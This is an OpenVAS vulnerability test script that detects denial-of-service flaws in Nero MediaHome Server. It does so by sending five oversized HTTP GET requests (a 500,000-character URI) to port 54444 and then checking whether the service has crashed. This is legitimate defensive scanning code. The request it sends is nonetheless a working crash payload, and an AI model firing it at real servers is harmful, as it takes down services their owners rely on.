###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nero_mediahome_server_mult_dos_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Nero MediaHome Server Multiple Remote DoS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803150");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2012-5876", "CVE-2012-5877");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-01-10 14:19:03 +0530 (Thu, 10 Jan 2013)");
  script_name("Nero MediaHome Server Multiple Remote DoS Vulnerabilities");

  script_tag(name:"summary", value:"Nero MediaHome Server is prone to multiple denial of service
  vulnerabilities.");
  script_tag(name:"vuldetect", value:"This test works by sending a big size request to the target
  service listening on port 54444/TCP and checking that  the target service is dead.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"affected", value:"Nero MediaHome Server version 4.5.8.100 and prior");
  script_tag(name:"insight", value:"Multiple flaws are due to improper handling of the URI length,
  HTTP OPTIONS method length, HTTP HEAD request, HTTP REFERER and HTTP HOST header
  within the 'NMMediaServer.dll' in dynamic-link library which allows attackers to
  cause denial of service condition by sending a specially crafted packet
  to port 54444/TCP.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://inter5.org/archives/226548");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Jan/36");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23130");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525249/30/0/threaded");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 54444);
  script_mandatory_keys("Nero-MediaHome/banner");

  exit(0);
}


include("http_func.inc");

port = get_http_port(default:54444);

banner = get_http_banner(port: port);
if(!banner || "Nero-MediaHome/" >!< banner){
  exit(0);
}

req = http_get(item:string("/A",crap(500000)), port:port);

for(i=0; i<5; i++)
{
 ## Send crafted request
 res = http_send_recv(port:port, data:req);
}

sleep(2);

if(http_is_dead(port:port)){
  security_message(port);
  exit(0);
}

exit(99);
